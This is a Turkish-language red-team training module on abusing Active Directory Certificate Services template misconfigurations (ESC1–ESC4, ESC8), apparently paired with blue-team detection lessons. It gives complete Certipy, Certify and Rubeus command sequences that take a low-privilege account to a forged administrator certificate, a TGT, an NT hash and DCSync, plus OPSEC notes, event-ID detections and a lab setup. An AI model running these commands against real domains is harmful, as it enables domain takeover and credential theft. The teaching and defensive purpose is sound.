## 1. Kavramsal Temel — Neden Var?

AD CS (Active Directory Certificate Services), kimlik doğrulama için **sertifika** verir. Ve sertifikaların AD saldırılarında bu kadar yıkıcı olmasının tek bir sebebi vardır:

> **Bir sertifika, PKINIT üzerinden Kerberos TGT almak için kullanılabilir — yani sertifika = kimlik. Bir sertifikanın "kim olduğunu" belirleyen alan **SAN (Subject Alternative Name)**'dir. Eğer bir sertifika şablonu, isteyene SAN'ı KENDİ belirletmeye izin veriyorsa, saldırgan "ben administrator'ım" diyen bir sertifika ister → onunla DA olarak TGT alır. Üstelik sertifika, kurbanın parolası değişse bile geçerli kalır (uzun ömürlü kalıcılık).**

SpecterOps'un 2021 "Certified Pre-Owned" araştırması bu yanlış yapılandırmaları **ESC1–ESC8** (Escalation) olarak sınıfladı. Çoğu bir "exploit" değil, **şablon/CA yanlış yapılandırmasıdır** — yama ile değil, yapılandırma denetimiyle kapanır ([Blue 07.1](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/07.1_Sertifika_Sablonu_Izin_Denetimi_ESC.md)).

**Analoji:** CA = kimlik kartı basan resmi daire. ESC1 = "kart üzerine hangi ismi yazacağını sen söyle" diyen bozuk bir başvuru formu. Sen "CEO" yazdırırsın; kapıdaki görevli (DC) kartı geçerli görüp CEO muamelesi yapar.

## 2. Teknik Derinlik — ESC Kataloğu ve Mekaniği

### 2.1 En kritik: ESC1 (SAN belirtme)

```
   Bir sertifika şablonu şu koşulları taşıyorsa ESC1:
   ┌────────────────────────────────────────────────────────────────┐
   │ 1) Enrollee Supplies Subject  (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)│  ← SAN'ı BEN veririm
   │ 2) EKU = Client Authentication / PKINIT / Any Purpose / SmartCard│  ← kimlik doğrulama için
   │ 3) Enroll hakkı düşük-yetki kullanıcılara açık                   │
   │ 4) Manager approval YOK, yetkili imza YOK                        │
   └────────────────────────────────────────────────────────────────┘
   → "SAN: administrator@corp.local" diyen sertifika iste → PKINIT ile DA TGT
```

### 2.2.1 ESC8 — web enrollment + NTLM relay (özel yüzey)

```
   AD CS web enrollment (http://CA/certsrv) NTLM kabul eder ve varsayılan olarak
   imzalama/EPA zorlamaz → NTLM RELAY hedefi:
   ┌────────────────────────────────────────────────────────────────┐
   │ 1) Koersiyon (PetitPotam, Modül 08) → DC01$'ı saldırgana zorla  │
   │ 2) ntlmrelayx → http://CA/certsrv/certfnsh.asp'ye relay          │
   │ 3) DC01$ adına 'DomainController' şablonuyla sertifika alınır    │
   │ 4) certipy auth → DC01$ TGT → DCSync                             │
   └────────────────────────────────────────────────────────────────┘
   → Tam zincir Modül 08.3'te; burada ESC8'in AD CS ayağı.
```

### 2.3 SAN → PKINIT → kimlik zinciri (paket seviyesi)

```
   1) CSR (Certificate Signing Request) oluştur, SAN = administrator@corp.local
   2) CA sertifikayı imzalar (şablon SAN'ı kabul ettiği için)
   3) AS-REQ (PKINIT): sertifikanın private key'iyle imzalı → DC, sertifikayı doğrular
   4) DC, SAN'daki UPN'i (administrator) okur → o kullanıcı için TGT verir
   5) TGT ile DCSync/istediğin her şey (administrator olarak)
   → 2022 yamaları (KB5014754) sonrası: sertifikaya SID bağlama (strong mapping) gerekir,
     aksi hâlde uyumluluk moduna göre reddedilir → 07.2 Certifried bununla ilgilidir.
```

## 3. Pratik Uygulama — Çok Araçlı

### 3.1 Zafiyetli şablonları bul (Certipy / Certify)

```bash
# Certipy (Linux) — tüm ESC'leri otomatik denetle
certipy find -u jdoe@corp.local -p 'Welcome1' -dc-ip 10.10.10.5 -vulnerable -stdout
#  → "ESC1: Template 'UserCert' allows SAN and Client Auth for Domain Users"
```

```
:: Certify (Windows)
Certify.exe find /vulnerable
Certify.exe find /vulnerable /currentuser
```

### 3.2 ESC1 sömürü (SAN=administrator)

```bash
# Certipy — SAN'ı administrator yaparak sertifika iste
certipy req -u jdoe@corp.local -p 'Welcome1' -ca 'CORP-CA' -template 'UserCert' \
  -upn administrator@corp.local -dc-ip 10.10.10.5
#  → administrator.pfx üretilir

# pfx ile PKINIT TGT + NT hash (UnPAC)
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.5
#  → TGT + administrator NT hash
```

```
:: Certify + Rubeus (Windows)
Certify.exe request /ca:DC01\CORP-CA /template:UserCert /altname:administrator
:: → .pem'i .pfx'e çevir (openssl), sonra:
Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /getcredentials /ptt
```

**Örnek çıktı (Certipy):**
```
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Certificate object SID: None
[*] Saving certificate and private key to 'administrator.pfx'
[*] Authenticating... Got TGT   NT hash: a1b2c3...   ← administrator ele geçti
```

### 3.3 ESC3 (Enrollment Agent) ve ESC2

```bash
# ESC3: önce ajan sertifikası, sonra "on-behalf-of" başka kullanıcı için enroll
certipy req -u jdoe@corp.local -p 'Welcome1' -ca 'CORP-CA' -template 'EnrollmentAgent'
certipy req -u jdoe@corp.local -p 'Welcome1' -ca 'CORP-CA' -template 'User' \
  -on-behalf-of 'corp\administrator' -pfx agent.pfx
```

## 4. Bıraktığı İz ve Karşı Tespit

| Teknik | MITRE ATT&CK | Bıraktığı iz (IOC) | Karşı Blue tespiti |
|--------|--------------|--------------------|--------------------|
| ESC1 sertifika talebi | **T1649** (Steal or Forge Auth Certificates) | **4886/4887** (CA'da talep/verildi), SAN≠talep eden | [Blue 07.4](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/07.4_PKI_Izleme_ve_Olay_Kayitlari.md) |
| PKINIT ile kimlik doğrulama | T1558 | **4768** certificate info; sertifika seri no | [Blue 07.4](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/07.4_PKI_Izleme_ve_Olay_Kayitlari.md) |
| Zafiyetli şablon keşfi | T1087 / T1649 | LDAP `pKICertificateTemplate` okuma (genelde loglanmaz) | [Blue 07.1](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/07.1_Sertifika_Sablonu_Izin_Denetimi_ESC.md) |

**OPSEC notları:**
- **4886/4887 (CA talep/verildi)** en güvenilir izdir: talep eden `jdoe` ama sertifikanın SAN'ı `administrator` → tutarsızlık güçlü sinyaldir ([Blue 07.4](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/07.4_PKI_Izleme_ve_Olay_Kayitlari.md)). CA denetimi kapalıysa bu iz kaybolur — ama çoğu ortam CA loglarını tutar.
- **Sertifika süper-kalıcıdır:** verilen sertifika, kurbanın parolası değişse bile geçerlilik süresince (genelde 1 yıl) çalışır → parola reset'i saldırıyı durdurmaz. Bu yüzden savunma iptal (revocation) + şablon düzeltme yapar. Bu kalıcılık boyutu → [07.4](./07.4_ForgeCert_ve_Sertifika_Kaliciligi.md).
- **KB5014754 uyumluluk modu:** 2022 sonrası ortamlar sertifikaya SID gömülmesini zorlayabilir (`Full Enforcement`). SAN-only sertifikalar reddedilebilir → o zaman [Certifried](./07.2_Certifried_CVE_2022_26923.md)/SID-uyumlu yollar gerekir. Ortamın uyumluluk seviyesini bil.
- **Certipy trafiği:** RPC (`ICertPassage`) veya web enrollment üzerinden gider; EDR/ağ tespiti düşüktür ama CA olay logları asıl risktir.

## 5. Doğrulama / Lab

```bash
# 1) Lab: bir şablonu ESC1 yap (Enrollee supplies subject + Client Auth + Domain Users enroll)
# 2) certipy find -vulnerable → ESC1 tespitini gör
# 3) certipy req -upn administrator → pfx → certipy auth → administrator NT hash
# 4) Blue: CA'da 4886/4887'de SAN=administrator, talep eden=jdoe tutarsızlığını yakala
Get-WinEvent -LogName 'Microsoft-Windows-CertificationAuthority' | ? Id -in 4886,4887
# 5) Şablonu düzelt (Enrollee supplies subject KAPAT) → aynı saldırı başarısız olmalı
```

Atomic Red Team: **T1649** → Blue doğrulaması [Blue 07.1](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/07.1_Sertifika_Sablonu_Izin_Denetimi_ESC.md).

### Gerçek-dünya ESC1 tam zinciri (foothold → DA)

```
   1) certipy find -vulnerable → 'UserCert' şablonu ESC1 (Domain Users enroll + SAN + Client Auth)
   2) certipy req -upn administrator → administrator.pfx (parola bilmeden!)
   3) certipy auth -pfx administrator.pfx → administrator TGT + NT hash
   4) NT hash → DCSync (Modül 09) veya TGT ile doğrudan DC işlemleri
   Tek zafiyetli şablon + tek düşük-yetki hesap = domain admin. Parola sıfırlama yok, servis bozulmaz.
```

### Ek: ESC4 zinciri (şablonu zafiyetli hâle getir)

```bash
# Şablon üzerinde WriteProperty/GenericAll varsa (ESC4): şablonu ESC1 yap → sömür → geri al
certipy template -u jdoe@corp.local -p 'Welcome1' -template 'VulnTemplate' -save-old -write-default-configuration
#  → şablon "Enrollee supplies subject + Client Auth" olur → ESC1 gibi sömür
#  → -configuration old_config.json ile eski hâline döndür (temizlik)
```
